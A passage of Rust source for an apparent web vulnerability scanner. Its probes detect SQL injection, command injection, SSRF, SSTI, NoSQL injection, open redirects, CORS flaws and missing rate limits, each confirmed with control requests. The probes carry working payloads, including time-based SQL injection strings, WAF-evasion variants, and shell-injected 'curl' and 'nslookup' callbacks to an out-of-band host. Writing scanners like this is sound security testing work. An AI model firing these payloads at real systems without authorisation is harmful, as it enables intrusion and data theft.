    after.split('/').next().unwrap_or("").to_string()
}

fn looks_like_id_seg(seg: &str) -> bool {
    if seg.is_empty() {
        return false;
    }
    if seg.chars().all(|c| c.is_ascii_digit()) {
        return true; // numeric id
    }
    let dashes = seg.matches('-').count();
    if seg.len() >= 32 || (dashes >= 4 && seg.len() >= 30) {
        return true; // uuid / long token
    }
    seg.len() >= 4
        && seg.chars().any(|c| c.is_ascii_digit())
        && seg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

fn path_only(url: &str) -> String {
    let after = url.split("://").nth(1).unwrap_or(url);
    let start = after.find('/').unwrap_or(after.len());
    after[start..]
        .split(['?', '#'])
        .next()
        .unwrap_or("")
        .to_string()
}

/// Rebuild `url` with path segment `idx` replaced by the percent-encoded `value`.
fn set_path_seg(url: &str, idx: usize, value: &str) -> String {
    let (scheme, rest) = match url.split_once("://") {
        Some((s, r)) => (format!("{s}://"), r),
        None => (String::new(), url),
    };
    let (authority, tail) = match rest.find('/') {
        Some(p) => (&rest[..p], &rest[p..]),
        None => (rest, ""),
    };
    let (path, suffix) = match tail.find(['?', '#']) {
        Some(p) => (&tail[..p], &tail[p..]),
        None => (tail, ""),
    };
    let mut segs: Vec<String> = path.split('/').map(|s| s.to_string()).collect();
    if idx < segs.len() {
        segs[idx] = pct_encode(value);
    }
    format!("{scheme}{authority}{}{suffix}", segs.join("/"))
}

async fn send_site(client: &Client, site: &Site, value: &str) -> Option<Resp> {
    let (url, body) = site.render(value);
    let headers = site.header_override(value);
    send_with(
        client,
        &site.method,
        &url,
        body.as_ref().map(|(b, c)| (b.as_str(), *c)),
        &headers,
    )
    .await
}

// ---------------------------------------------------------------- SQLi
async fn probe_sqli(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    // 1) error-based: an unbalanced quote yields a DB error the baseline lacks; a
    //    balanced-quote control must NOT error (else the app just always errors).
    let base = &site.base_value;
    if !is_sql_error(&baseline.body) {
        for q in ["'", "\""] {
            let broken = send_site(client, site, &format!("{base}{q}")).await;
            if let Some(r) = &broken {
                if is_sql_error(&r.body) {
                    let ctrl = send_site(client, site, &format!("{base}{q}{q}")).await;
                    let ctrl_clean = ctrl.map(|c| !is_sql_error(&c.body)).unwrap_or(false);
                    let again = send_site(client, site, &format!("{base}{q}")).await;
                    if ctrl_clean && again.map(|a| is_sql_error(&a.body)).unwrap_or(false) {
                        return Some(finding(
                            "sqli",
                            "SQL injection (error-based)",
                            "high",
                            site,
                            format!(
                                "Injecting a single unbalanced quote into the {} produced a database error, and a balanced quote did not -- the value reaches a SQL statement unparameterised.",
                                site.where_label()
                            ),
                        ));
                    }
                }
            }
        }
    }
    // 2) syntax-break differential: a lone quote/paren that breaks the SQL makes the app ERROR (5xx or
    //    a stack-trace page), while a BALANCED control (doubled quote, or the same quote commented out)
    //    does NOT. This catches the common case where the DB error is swallowed into a generic 500 /
    //    custom error page, so `is_sql_error` never matches (e.g. an ASP.NET NullReference after the
    //    query fails). Requiring the comment/doubled-quote to RECOVER separates SQLi from a back-end
    //    that just 500s on any weird input (generic validation would reject the recovery form too).
    if !is_server_error(baseline.status, &baseline.body) {
        for (brk, comment) in [("'", "'-- -"), ("\"", "\"-- -"), (")", ")-- -")] {
            let broken = send_site(client, site, &format!("{base}{brk}")).await;
            let broke = broken
                .as_ref()
                .map(|r| is_server_error(r.status, &r.body))
                .unwrap_or(false);
            if !broke {
                continue;
            }
            // Two independent recovery forms: doubled delimiter, and comment-out. Both must come back
            // clean, and the break must reproduce, before we call it.
            let doubled = format!("{base}{brk}{brk}");
            let r_double = send_site(client, site, &doubled).await;
            let r_comment = send_site(client, site, &format!("{base}{comment}")).await;
            let again = send_site(client, site, &format!("{base}{brk}")).await;
            let clean = |r: &Option<Resp>| {
                r.as_ref()
                    .map(|x| !is_server_error(x.status, &x.body))
                    .unwrap_or(false)
            };
            let repro = again
                .as_ref()
                .map(|x| is_server_error(x.status, &x.body))
                .unwrap_or(false);
            // The doubled delimiter is the mandatory recovery; the
            // comment-out is corroboration when it agrees.
            //
            // Doubling the quote is the minimal repair that PRESERVES the
            // query's meaning: it stays inside the string literal, so the same
            // rows match and the app takes the same code path. Commenting the
            // rest out CHANGES the meaning - it can turn a query that matched
            // nothing into one that matches a row, after which the app acts on
            // that row and may fail there for reasons that are not SQL at all.
            // RailsGoat does exactly this: the commented form finds user 1 and
            // then errors inside save!, while the doubled form matches no row
            // and returns cleanly.
            //
            // Requiring both therefore loses real injections in any app that
            // hides DB errors and does work after the query, which is most
            // production software. Requiring the doubled form keeps the
            // precision control that matters: a backend that merely errors on
            // odd input would error on the doubled form too, since that also
            // carries a delimiter.
            if clean(&r_double) && repro {
                return Some(finding(
                    "sqli",
                    "SQL injection (error-based, differential)",
                    "high",
                    site,
                    format!(
                        "An unbalanced `{brk}` in the {} triggered a server error while the balanced form returned normally{} -- the value breaks and re-balances a SQL statement, so it is injected unparameterised (the DB error is masked behind a generic error page).",
                        site.where_label(),
                        if clean(&r_comment) {
                            ", as did the commented-out form"
                        } else {
                            " (the commented-out form did not, which is what happens when commenting the rest out makes the query match a row the app then acts on)"
                        }
                    ),
                ));
            }
        }
    }
    // 3) boolean-based
    // AND-pairs FIRST: they are the reliable test when the base value is a VALID identifier that
    // already returns a row (e.g. ?RecNo=16530062). There, an OR-tautology changes nothing the app
    // shows (the row still matches), so OR-pairs don't differentiate - but `AND 1=2` drops the row and
    // `AND 1=1` keeps it, a strong true/false split. Numeric context (no quote) with and without a
    // trailing comment, then the quoted string form. OR-pairs stay for params whose base value
    // normally returns NOTHING (search boxes, login fields), where the tautology is what reveals it.
    // The `/**/`-comment pair is a WAF-evasion variant of the numeric AND-pair: inline comments for
    // whitespace slip past filters that block ` AND `/`OR ` with spaces.
    let pairs = [
        (" AND 1=1", " AND 1=2"),
        (" AND 1=1-- -", " AND 1=2-- -"),
        ("/**/AND/**/1=1", "/**/AND/**/1=2"),
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1", "' OR '1'='2"),
        (" OR 1=1-- -", " OR 1=2-- -"),
    ];
    // Noise floor: sample the base once more and require the true/false split to clear its jitter, so
    // a page that just wobbles run-to-run (CSRF token, timestamp, ad slot) is not misread as an oracle.
    let jitter = send_site(client, site, base)
        .await
        .map(|r| (r.body.len() as i64 - baseline.body.len() as i64).abs())
        .unwrap_or(0);
    let min_diff = (jitter * 3).max(24);
    for (t, f) in pairs {
        let rt = send_site(client, site, &format!("{base}{t}")).await;
        let rf = send_site(client, site, &format!("{base}{f}")).await;
        if let (Some(a), Some(b)) = (rt, rf) {
            if boolean_differential(baseline, &a, &b, min_diff) {
                let rt2 = send_site(client, site, &format!("{base}{t}")).await;
                let rf2 = send_site(client, site, &format!("{base}{f}")).await;
                if let (Some(a2), Some(b2)) = (rt2, rf2) {
                    if boolean_differential(baseline, &a2, &b2, min_diff) {
                        return Some(finding(
                            "sqli",
                            "SQL injection (boolean-based blind)",
                            "high",
                            site,
                            format!(
                                "A tautology and a contradiction injected into the {} produced consistently different result sets (true={} bytes, false={} bytes), indicating the value is evaluated inside a SQL query.",
                                site.where_label(),
                                a2.body.len(),
                                b2.body.len()
                            ),
                        ));
                    }
                }
            }
        }
    }
    // 3) time-based blind. Cover the four major engines' delay primitives, not just MySQL/Postgres:
    // an ASP.NET / .aspx back-end is almost always MSSQL, which has neither SLEEP() nor pg_sleep() -
    // it needs `WAITFOR DELAY` (as a stacked statement), and Oracle needs DBMS_LOCK.SLEEP. Without
    // these, a blind SQLi on a SQL Server target is completely invisible to timing.
    let payloads = [
        // MySQL / MariaDB
        format!("' AND SLEEP({SLEEP_SECS})-- -"),
        format!("\" AND SLEEP({SLEEP_SECS})-- -"),
        format!("' AND SLEEP({SLEEP_SECS})#"),
        format!(" AND SLEEP({SLEEP_SECS})"),
        // PostgreSQL
        format!("');SELECT pg_sleep({SLEEP_SECS})-- -"),
        format!(" AND {SLEEP_SECS}=(SELECT {SLEEP_SECS} FROM PG_SLEEP({SLEEP_SECS}))"),
        // MSSQL (SQL Server) - stacked WAITFOR DELAY, numeric and both quote contexts
        format!(";WAITFOR DELAY '0:0:{SLEEP_SECS}'-- -"),
        format!("';WAITFOR DELAY '0:0:{SLEEP_SECS}'-- -"),
        format!("\";WAITFOR DELAY '0:0:{SLEEP_SECS}'-- -"),
        // Oracle
        format!("' AND DBMS_LOCK.SLEEP({SLEEP_SECS})-- -"),
    ];
    for p in payloads {
        let r = send_site(client, site, &format!("{base}{p}")).await;
        if r.as_ref()
            .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
            .unwrap_or(false)
        {
            // Neutralise the delay for the control run: SLEEP(5)->SLEEP(0) (also covers
            // DBMS_LOCK.SLEEP), pg_sleep, PG_SLEEP, and WAITFOR's '0:0:5'->'0:0:0'.
            let zero = p
                .replace(&format!("SLEEP({SLEEP_SECS})"), "SLEEP(0)")
                .replace(&format!("pg_sleep({SLEEP_SECS})"), "pg_sleep(0)")
                .replace(&format!("PG_SLEEP({SLEEP_SECS})"), "PG_SLEEP(0)")
                .replace(&format!("0:0:{SLEEP_SECS}"), "0:0:0");
            let rc = send_site(client, site, &format!("{base}{zero}")).await;
            let again = send_site(client, site, &format!("{base}{p}")).await;
            let ctrl_fast = rc
                .map(|x| x.elapsed_ms < SLEEP_THRESHOLD_MS)
                .unwrap_or(false);
            let repro = again
                .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
                .unwrap_or(false);
            if ctrl_fast && repro {
                return Some(finding(
                    "sqli",
                    "SQL injection (time-based blind)",
                    "high",
                    site,
                    format!(
                        "A `SLEEP({SLEEP_SECS})` injected into the {} delayed the response past {}ms while a `SLEEP(0)` control returned promptly and the delay reproduced.",
                        site.where_label(),
                        SLEEP_THRESHOLD_MS
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- OS command injection
async fn probe_cmdi(
    client: &Client,
    site: &Site,
    oast: Option<&crate::oast::OastClient>,
    oob_reg: Option<&crate::oast::OastReg>,
    oob_queue: Option<&OobQueue>,
) -> Option<Value> {
    let base = &site.base_value;

    // Fast, zero-FP oracle for the common reflected case: when the target echoes command output,
    // a shell-EVALUATED arithmetic marker shows up computed in the response, while the literal
    // payload (which carries the un-evaluated `$((a*b))`) never contains the product. So a match is
    // proof a shell ran the command - one request per separator, no sleeps, no OAST budget spent.
    // Tried first because it is both the cheapest and the most reliable signal when output reflects.
    {
        let prod = CMDI_ECHO_A * CMDI_ECHO_B; // computed here; the target's shell must reproduce it
        let marker = format!("zZcx{prod}xcZz");
        for sep in [";", "|", "&&", "$(", "`"] {
            let close = match sep {
                "$(" => ")",
                "`" => "`",
                _ => "",
            };
            let pl = format!("{base}{sep}echo zZcx$(({CMDI_ECHO_A}*{CMDI_ECHO_B}))xcZz{close}");
            if let Some(r) = send_site(client, site, &pl).await {
                if r.body.contains(&marker) {
                    return Some(finding(
                        "cmdi",
                        "OS command injection (output reflected)",
                        "critical",
                        site,
                        format!(
                            "A shell-evaluated arithmetic marker injected into the {} (separator `{sep}`) came back computed in the response, while the literal payload only ever carries the un-evaluated expression -- the value is executed by a shell.",
                            site.where_label()
                        ),
                    ));
                }
            }
        }
    }

    // Blind, out-of-band. Fire and park: the callback is checked once at the end
    // of the pass rather than waited on here. See `PendingOob`.
    if let (Some(oc), Some(reg), Some(q)) = (oast, oob_reg, oob_queue) {
        let (host, marker) = oc.host_marked(reg);
        for sep in [";", "|", "&&", "$(", "`"] {
            let close = if sep == "$(" {
                ")"
            } else if sep == "`" {
                "`"
            } else {
                ""
            };
            let _ = send_site(
                client,
                site,
                &format!("{base}{sep}curl http://{host}/c{close}"),
            )
            .await;
            let _ = send_site(client, site, &format!("{base}{sep}nslookup {host}{close}")).await;
        }
        if let Ok(mut v) = q.lock() {
            v.push(PendingOob {
                marker,
                finding: finding(
                    "cmdi",
                    "OS command injection (blind, OAST-confirmed)",
                    "critical",
                    site,
                    format!(
                        "A shell metacharacter + `curl`/`nslookup` injected into the {} produced an out-of-band callback -- the value is executed by a shell.",
                        site.where_label()
                    ),
                ),
            });
        }
    }
    for sep in [";", "|", "&&", "$(", "`"] {
        let close = if sep == "$(" {
            ")"
        } else if sep == "`" {
            "`"
        } else {
            ""
        };
        let pl = format!("{base}{sep}sleep {SLEEP_SECS}{close}");
        let r = send_site(client, site, &pl).await;
        if r.as_ref()
            .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
            .unwrap_or(false)
        {
            let ctrl = send_site(client, site, &format!("{base}{sep}sleep 0{close}")).await;
            let again = send_site(client, site, &pl).await;
            let ctrl_fast = ctrl
                .as_ref()
                .map(|x| x.elapsed_ms < SLEEP_THRESHOLD_MS)
                .unwrap_or(false);
            let repro = again
                .as_ref()
                .map(|x| x.elapsed_ms >= SLEEP_THRESHOLD_MS)
                .unwrap_or(false);

            // The delay has to TRACK the number we asked for, not merely exist.
            //
            // A threshold plus a control is not enough on a target that is
            // already slow: the payload request, the control and the retry are
            // three different moments, and a target under load answers some
            // quickly and some slowly whatever we send. Measured against
            // Mutillidae during a concurrent pass, that produced eight
            // command-injection findings on parameters with no shell behind
            // them at all - `do=logout` among them, which answers in 8ms when
            // asked on its own.
            //
            // Doubling the sleep is the discriminator. A real shell takes
            // roughly twice as long; a slow application has no reason to.
            let scales = if repro {
                let long = format!("{base}{sep}sleep {}{close}", SLEEP_SECS * 2);
                let base_ms = again.as_ref().map(|x| x.elapsed_ms).unwrap_or(0);
                match send_site(client, site, &long).await {
                    // Allow for jitter and for the app's own cost, which is
                    // present in both measurements: require most of the extra
                    // sleep to show up.
                    Some(x) => x.elapsed_ms >= base_ms + (SLEEP_SECS as u128 * 1000 * 6 / 10),
                    None => false,
                }
            } else {
                false
            };
            if ctrl_fast && repro && scales {
                return Some(finding(
                    "cmdi",
                    "OS command injection (time-based blind)",
                    "critical",
                    site,
                    format!(
                        "A shell `sleep {SLEEP_SECS}` injected into the {} (separator `{sep}`) delayed the response past {}ms while `sleep 0` returned promptly, the delay reproduced, and doubling the sleep to {}s roughly doubled the delay. The response time tracks the number we asked for, which a merely slow application does not do.",
                        site.where_label(),
                        SLEEP_THRESHOLD_MS,
                        SLEEP_SECS * 2
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- SSRF (API7, OAST-confirmed)
/// Param names that commonly carry a URL/host the server then fetches. SSRF is only meaningful on
/// these (or on a value that already looks like a URL); firing on every string param would burn OAST
/// registrations and add noise for no signal.
static SSRF_HINT: &[&str] = &[
    "url",
    "uri",
    "link",
    "src",
    "source",
    "dest",
    "destination",
    "target",
    "callback",
    "webhook",
    "hook",
    "feed",
    "rss",
    "image",
    "img",
    "avatar",
    "photo",
    "proxy",
    "fetch",
    "load",
    "domain",
    "host",
    "site",
    "page",
    "redirect",
    "next",
    "returnurl",
    "continue",
    "reference",
    "endpoint",
    "upstream",
    "remote",
    "download",
];

fn looks_like_url(v: &str) -> bool {
    v.starts_with("http://")
        || v.starts_with("https://")
        || v.starts_with("//")
        || v.contains("://")
}

/// Blind SSRF: supply a URL pointing at our OAST listener in a URL-bearing param; if the server
/// fetches it we get an out-of-band callback. OAST-confirmed = no false positives. Reuses the same
/// managed/BYO OAST client the cmdi probe uses.
async fn probe_ssrf(
    client: &Client,
    client_nr: Option<&Client>,
    site: &Site,
    oast: Option<&crate::oast::OastClient>,
    oob_reg: Option<&crate::oast::OastReg>,
    oob_queue: Option<&OobQueue>,
) -> Option<Value> {
    let oc = oast?;
    let name = site.param.to_lowercase();
    let hinted = SSRF_HINT.iter().any(|h| name == *h || name.contains(h));
    if !hinted && !looks_like_url(&site.base_value) {
        return None;
    }
    let reg = oob_reg?;
    let q = oob_queue?;
    let (host, marker) = oc.host_marked(reg);
    // Send the payloads with a client that does NOT follow redirects.
    //
    // An open redirect answers 302 to wherever you point it, and a
    // redirect-following client then fetches our own listener - so the callback
    // arrives, and "the server fetched it" is false: WE fetched it. That is not
    // hypothetical; it reported SSRF on Crawlground's `/api/redirect`, which
    // only ever sets a Location header. Refusing to follow makes the callback
    // mean what the finding says it means.
    let sender = client_nr.unwrap_or(client);
    let mut redirected_to_listener = false;
    for payload in [
        format!("http://{host}/"),
        format!("https://{host}/"),
        format!("http://{host}/{}", site.param),
    ] {
        if let Some(r) = send_site(sender, site, &payload).await {
            if (300..400).contains(&r.status)
                && r.location
                    .as_deref()
                    .map(|l| l.contains(&host))
                    .unwrap_or(false)
            {
                redirected_to_listener = true;
            }
        }
    }
    if redirected_to_listener {
        // The endpoint pointed a browser at our listener rather than fetching
        // it. That is an open redirect, which probe_open_redirect reports, and
        // it is not SSRF. Nothing is parked, so a callback arriving from a
        // browser following that redirect cannot be read as a fetch.
        return None;
    }
    // Park it. One poll at the end of the pass decides whether the server
    // actually fetched our listener.
    if let Ok(mut v) = q.lock() {
        v.push(PendingOob {
            marker,
            finding: finding(
                "ssrf",
                "Server-side request forgery (blind, OAST-confirmed)",
                "high",
                site,
                format!(
                    "A URL pointing at our out-of-band listener, supplied in the {}, was fetched by the server: it makes outbound requests to attacker-controlled destinations (SSRF), which can reach internal-only services and cloud metadata endpoints.",
                    site.where_label()
                ),
            ),
        });
    }
    None
}

// ---------------------------------------------------------------- resource consumption (API4)
/// Sensitive endpoints where a missing rate limit is directly exploitable (credential stuffing,
/// OTP/2FA brute-force, password-reset abuse, signup flooding). Scoped to these to stay high-signal
/// rather than flagging every read endpoint that happens not to throttle.
static SENSITIVE_PATH: &[&str] = &[
    "login", "signin", "sign-in", "auth", "token", "otp", "mfa", "2fa", "twofa", "verify",
    "password", "passwd", "reset", "forgot", "register", "signup", "sign-up", "recover",
];

/// Missing rate limiting on a sensitive flow (OWASP API4). Fire a short burst of the baseline
/// request; if none are throttled (429 / 503 / Retry-After) the endpoint accepts unlimited attempts.
/// Deduped per (method, path) so a burst runs once, not per param.
async fn probe_ratelimit(client: &Client, ep: &InjEndpoint, seen: &SeenSet) -> Option<Value> {
    let path_l = ep.url.to_lowercase();
    if !SENSITIVE_PATH.iter().any(|k| path_l.contains(k)) {
        return None;
    }
    let key = format!("{} {}", ep.method.to_uppercase(), ep.url);
    if !seen_once(seen, key) {
        return None;
    }
    let method = ep.method.to_uppercase();
    // Build a representative body for write methods so the request is realistic.
    let body_owned: Option<(String, &'static str)> =
        if matches!(method.as_str(), "POST" | "PUT" | "PATCH") && !ep.body.is_empty() {
            let mut obj = serde_json::Map::new();
            for f in &ep.body {
                obj.insert(f.name.clone(), json_typed(&f.value, f.ty.as_deref()));
            }
            Some((Value::Object(obj).to_string(), "application/json"))
        } else {
            None
        };
    const BURST: usize = 20;
    let mut throttled = 0u32;
    let mut ok = 0u32;
    for _ in 0..BURST {
        let body_ref = body_owned.as_ref().map(|(b, ct)| (b.as_str(), *ct));
        match probe::send(client, &method, &ep.url, body_ref).await {
            Some(r) if r.status == 429 || r.status == 503 => throttled += 1,
            Some(_) => ok += 1,
            None => {}
        }
    }
    // Only flag when the burst clearly went through unthrottled (avoid a target that was simply down).
    if throttled == 0 && ok >= (BURST as u32 * 3 / 4) {
        return Some(
            Finding::new(
                "cortex-inject",
                "no_rate_limit",
                "Missing rate limiting on a sensitive endpoint",
                "medium",
                &ep.url,
            )
            .method(&method)
            .location("endpoint")
            .describe(format!(
                "{BURST} requests were sent in quick succession to this authentication/account endpoint and none were throttled (no 429 / Retry-After). Without rate limiting it is open to credential stuffing, OTP/2FA brute-force, and password-reset or signup flooding (OWASP API4: Unrestricted Resource Consumption)."
            ))
            .build(),
        );
    }
    None
}

// ---------------------------------------------------------------- improper inventory (API9)
/// A version token in a path: `/v1/`, `/v2/`, `/api/v3/...`. Captures the numeric version.
static VERSION_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)/v(\d+)(?:/|$)").unwrap());

/// Shadow / retired API versions (OWASP API9). Given a versioned operation `/api/v2/users`, probe
/// the sibling versions (`v1`, `v3`, ...); any that still answer as a real route (not 404 / not a
/// transport error) is an undocumented or un-retired version - a common source of "the old endpoint
/// skipped the new auth check". Deduped per (method, version-family) so it fires once, not per param.
async fn probe_inventory(client: &Client, ep: &InjEndpoint, seen: &SeenSet) -> Vec<Value> {
    let mut out = Vec::new();
    let url = ep.url.clone();
    let Some(m) = VERSION_RE.captures(&url) else {
        return out;
    };
    let cur: u32 = m.get(1).and_then(|g| g.as_str().parse().ok()).unwrap_or(0);
    let whole = m.get(0).unwrap().as_str().to_string(); // e.g. "/v2/" or "/v2"
    // family key = method + path with the version blanked, so /v1/x and /v2/x share one probe.
    let family = format!(
        "{} {}",
        ep.method.to_uppercase(),
        url.replacen(&whole, "/v#/", 1)
    );
    if !seen_once(seen, family) {
        return out;
    }
    let method = ep.method.to_uppercase();
    // Probe versions 1..=cur+2 (skip the current one). Cap the span so a huge version number
    // does not explode the request count.
    let lo = 1u32;
    let hi = cur.saturating_add(2).min(lo + 8);
    for v in lo..=hi {
        if v == cur {
            continue;
        }
        let sib_seg = whole.replace(&format!("v{cur}"), &format!("v{v}"));
        let sib_url = url.replacen(&whole, &sib_seg, 1);
        let Some(resp) = probe::send(client, &method, &sib_url, None).await else {
            continue;
        };
        // 404 / 410 = the version genuinely does not exist. Anything else (200/2xx, 401/403 auth,
        // 405 method, 5xx app error) means the route is wired up -> a live sibling version.
        if resp.status != 404 && resp.status != 410 && resp.status != 0 {
            out.push(
                Finding::new(
                    "cortex-inject",
                    "improper_inventory",
                    "Undocumented / shadow API version",
                    "medium",
                    &sib_url,
                )
                .method(&method)
                .location("path")
                .describe(format!(
                    "The operation is versioned `v{cur}`, but sibling version `v{v}` at this path still answers (HTTP {}) instead of 404. Undocumented or un-retired versions frequently miss the auth, validation, or rate-limit fixes applied to the current version (OWASP API9: Improper Inventory Management).",
                    resp.status
                ))
                .build(),
            );
        }
    }
    out
}

// ---------------------------------------------------------------- reflected XSS
// ---------------------------------------------------------------- open redirect
static REDIRECT_HINT: &[&str] = &[
    "redirect",
    "redirect_uri",
    "redirecturl",
    "redir",
    "url",
    "next",
    "return",
    "returnurl",
    "return_url",
    "returnto",
    "goto",
    "dest",
    "destination",
    "continue",
    "target",
    "callback",
    "forward",
    "to",
    "u",
    "r",
    "link",
    "out",
    "view",
    "page",
    "checkout_url",
    "success_url",
    "cancel_url",
    "back",
    "backurl",
    "origin",
    "path",
];
const REDIR_MARKER_HOST: &str = "cfx-redir.example";

/// Open redirect: a redirect-target param reflected into the `Location` of a 3xx pointing at an
/// attacker host. Needs the NO-REDIRECT client so we see the 3xx + Location instead of the followed
/// page. Scoped to redirect-looking params (or values that already look like a URL) to stay quiet.
async fn probe_open_redirect(client_nr: &Client, site: &Site) -> Option<Value> {
    if !matches!(site.loc, Loc::Query | Loc::BodyForm | Loc::BodyJson) {
        return None;
    }
    let name = site.param.to_lowercase();
    let hinted = REDIRECT_HINT.iter().any(|h| name == *h || name.contains(h))
        || looks_like_url(&site.base_value);
    if !hinted {
        return None;
    }
    for payload in [
        format!("https://{REDIR_MARKER_HOST}/"),
        format!("//{REDIR_MARKER_HOST}/"),
        format!("https:/{REDIR_MARKER_HOST}/"),
        format!("/\\{REDIR_MARKER_HOST}/"),
    ] {
        let hit = |r: &Option<Resp>| {
            r.as_ref()
                .filter(|x| (300..400).contains(&x.status))
                .and_then(|x| x.location.as_deref())
                .and_then(redirect_host)
                .map(|h| h == REDIR_MARKER_HOST)
                .unwrap_or(false)
        };
        let r = send_site(client_nr, site, &payload).await;
        if hit(&r) {
            let again = send_site(client_nr, site, &payload).await;
            if hit(&again) {
                return Some(finding(
                    "open_redirect",
                    "Open redirect",
                    "medium",
                    site,
                    format!(
                        "A URL supplied in the {} was reflected into the `Location` header (a 3xx redirect to {REDIR_MARKER_HOST}), so the endpoint sends users to attacker-controlled destinations -- usable for phishing and for laundering OAuth/token flows.",
                        site.where_label()
                    ),
                ));
            }
        }
    }
    None
}

/// Destination host of a `Location` value, tolerating scheme-relative (`//h`), backslash (`/\h`),
/// and userinfo (`user@h`) tricks browsers still honour.
fn redirect_host(loc: &str) -> Option<String> {
    let s = loc.trim();
    let rest = s
        .strip_prefix("https://")
        .or_else(|| s.strip_prefix("http://"))
        .or_else(|| s.strip_prefix("//"))
        .or_else(|| s.strip_prefix("/\\"))
        .or_else(|| s.strip_prefix("\\\\"))?;
    let host = rest.split(['/', '?', '#', '\\']).next().unwrap_or("");
    let host = host.rsplit('@').next().unwrap_or(host); // strip userinfo
    let host = host.split(':').next().unwrap_or(host); // strip port
    (!host.is_empty()).then(|| host.to_lowercase())
}

// ---------------------------------------------------------------- SSTI
/// Server-side template injection: an arithmetic template expression that evaluates server-side.
/// Sandwiched in unique markers so the evaluated `49` cannot be a coincidental substring. Covers
/// Jinja2/Twig `{{ }}`, Freemarker / JSP-EL `${ }`, Ruby `#{ }`, ERB `<%= %>`, and Smarty `{ }`.
async fn probe_ssti(client: &Client, site: &Site) -> Option<Value> {
    let a = format!("cfxA{}", site.param.len() + 3);
    let b = format!("B{}cfx", site.url.len() % 97);
    let want = format!("{a}49{b}");
    let payloads = [
        format!("{a}{{{{7*7}}}}{b}"),
        format!("{a}${{7*7}}{b}"),
        format!("{a}#{{7*7}}{b}"),
        format!("{a}<%= 7*7 %>{b}"),
        format!("{a}{{7*7}}{b}"),
    ];
    for p in &payloads {
        // A payload whose request failed is one payload lost, not the whole
        // class. `?` here abandoned every remaining payload the moment one
        // request timed out, which is common the instant anything else on the
        // scan is issuing time-based probes.
        let Some(r) = send_site(client, site, p).await else {
            continue;
        };
        if r.body.contains(&want) {
            let Some(again) = send_site(client, site, p).await else {
                continue;
            };
            if again.body.contains(&want) {
                return Some(finding(
                    "ssti",
                    "Server-side template injection",
                    "high",
                    site,
                    format!(
                        "A template expression injected into the {} was evaluated server-side (`7*7` rendered as `49` between our markers) -- server-side template injection, frequently escalatable to remote code execution.",
                        site.where_label()
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- NoSQL injection
/// NoSQL operator injection on a JSON body field: replace the value with a MongoDB-style operator
/// object and look for a result-set change (a match-everything `$gt:""` vs a match-nothing high
/// sentinel). Confirmed by a reproducible boolean differential, so it does not fire on a field the
/// server simply ignores. JSON bodies only (that is where operator objects are interpreted).
async fn probe_nosql(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    if site.loc != Loc::BodyJson {
        return None;
    }
    let hi = "\u{ffff}\u{ffff}\u{ffff}"; // sorts after almost any real value
    let t_op = json!({ "$gt": "" });
    let f_op = json!({ "$gt": hi });
    let send_op = |raw: Value| async move {
        let (body, ctype) = site.render_body_json_raw(&raw)?;
        send(
            client,
            &site.method,
            &site.url,
            Some((body.as_str(), ctype)),
        )
        .await
    };
    let a = send_op(t_op.clone()).await;
    let b = send_op(f_op.clone()).await;
    if let (Some(a), Some(b)) = (a, b) {
        if boolean_differential(baseline, &a, &b, 32) {
            let a2 = send_op(t_op).await;
            let b2 = send_op(f_op).await;
            if let (Some(a2), Some(b2)) = (a2, b2) {
                if boolean_differential(baseline, &a2, &b2, 32) {
                    return Some(finding(
                        "nosqli",
                        "NoSQL injection (operator injection)",
                        "high",
                        site,
                        format!(
                            "A MongoDB-style operator object injected into the JSON {} changed the result set (a match-all `$gt` vs a match-none sentinel), so the value is used unsanitised in a NoSQL query -- an authentication/authorization bypass or data-exfiltration vector.",
                            site.where_label()
                        ),
                    ));
                }
            }
        }
    }
    None
}

// ---------------------------------------------------------------- CORS misconfiguration
/// A request carrying an attacker `Origin` that the server reflects into `Access-Control-Allow-Origin`
/// while also allowing credentials means any site can read this endpoint's authenticated responses
/// cross-origin. Confirmed by reproducing the reflection. Endpoint-level, deduped per URL.
async fn probe_cors(client: &Client, ep: &InjEndpoint, seen: &SeenSet) -> Option<Value> {
    if !seen_once(seen, ep.url.clone()) {
        return None;
    }
    let method = ep.method.to_uppercase();
    let evil = "https://cfx-cors.example".to_string();
    let hdrs = vec![("Origin".to_string(), evil.clone())];
    let check = |r: &Option<Resp>| -> Option<String> {
        let r = r.as_ref()?;
        let acao = r.header("access-control-allow-origin")?;
        let acac = r
            .header("access-control-allow-credentials")
            .map(|v| v.eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        // Exploitable: attacker origin reflected + credentials allowed, or wildcard + credentials.
        if acac && (acao == evil || acao == "*") {
            Some(acao.to_string())
        } else {
            None
        }
    };
    let r1 = send_with(client, &method, &ep.url, None, &hdrs).await;
    let acao = check(&r1)?;
    let r2 = send_with(client, &method, &ep.url, None, &hdrs).await;
    // Require the reflection to reproduce before reporting (confirm-before-report).
    check(&r2)?;
    Some(
        Finding::new(
            "cortex-inject",
            "cors",
            "CORS misconfiguration (credentialed cross-origin read)",
            "high",
            &ep.url,
        )
        .method(&method)
        .location("header")
        .describe(format!("The endpoint reflects an arbitrary request `Origin` into `Access-Control-Allow-Origin` (`{acao}`) while allowing credentials - so any attacker-controlled site can read this endpoint's authenticated cross-origin responses (account takeover / data theft)."))
        .build(),
    )
}

// ---------------------------------------------------------------- CRLF / header injection
/// A CR/LF injected into a value that the app copies into a response header lets an attacker inject
/// arbitrary headers (session fixation via Set-Cookie, cache poisoning, response splitting). Confirmed
/// by our own header materialising in the response - zero false positives.
async fn probe_crlf(client: &Client, site: &Site) -> Option<Value> {
    // Only URL-ish injection points: query/path/header (a body value is not copied into headers).
    if !matches!(site.loc, Loc::Query | Loc::Path | Loc::Header) {
        return None;
    }
    let marker = format!("cfxhi{}z{}", site.url.len(), site.param.len());
    let base = &site.base_value;
    // Raw CR/LF; set_param percent-encodes it (%0D%0A) on the wire, the app decodes it, and if it
    // writes the value into a header our injected `X-Cfx-Inj` header splits out. Try single and double
